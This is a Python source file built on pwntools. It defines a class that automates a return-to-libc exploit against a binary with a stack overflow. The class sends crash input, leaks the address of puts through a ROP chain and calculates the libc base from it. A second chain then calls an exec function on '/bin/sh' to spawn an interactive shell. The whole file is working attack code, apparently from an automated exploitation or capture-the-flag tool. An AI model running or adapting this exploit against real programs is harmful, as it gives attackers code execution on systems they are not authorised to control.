from pwn import *

context.log_level = 'DEBUG'


class RopExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.inputs = []
        self.controlled_stack_space = 0
        self.parse_vuln(vuln_details)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.controlled_stack_space = vuln_details["ctrl_stack_space"]
        self.inputs = vuln_details["input"]
        self.output = vuln_details["output"]

    def leak_address_chain(self, rop: ROP):
        bin_elf = self.binary.elf
        rop.call(bin_elf.plt['puts'], [bin_elf.got['puts']])
        rop.call(bin_elf.entry)

    def get_shell_chain(self, rop: ROP):
        exec_func = self.binary.find_exec_function(search_libc=True)
        binsh = self.binary.find_binsh(search_libc=True)
        exit_func = self.binary.find_function("exit", search_libc=True)
        rop.call(exec_func, [binsh])
        rop.call(exit_func)

    def apply_crash_input(self, process, rop, payload_func):
        current_output = b""
        for i, input in enumerate(self.inputs):
            current_output += process.clean_and_log()
            ip = b"X" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                chain_length = len(input)
                log.info("total payload length: {}".format(chain_length))
                offset = input.index(ip)
                log.info("buffer offset: {}".format(offset))
                exploit_entry_input = input[0:offset]

                rop.raw(exploit_entry_input)
                payload_func(rop)
                chain = rop.chain()
                # padded_chain = chain.ljust(chain_length, asm(shellcraft.nop()))
                # print(padded_chain)
                process.sendline(chain)

        log.info("current output: {}".format(current_output))
        self.last_output = self.output.replace(current_output, b"")
        log.info("last output: {}".format(self.last_output))


    def exploit(self):
        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')

        rop = ROP([self.binary.elf])
        self.apply_crash_input(process, rop, self.leak_address_chain)

        process.recvuntil(self.last_output)
        leak_bytes = process.recvuntil(b"\n")
        # print("leak:", leak_bytes)
        leak = unpack(leak_bytes.rstrip().ljust(8, b'\x00'))
        self.binary.adjust_libc_base(leak)

        rop_libc = ROP([self.binary.libc])
        self.apply_crash_input(process, rop_libc, self.get_shell_chain)

        process.interactive()
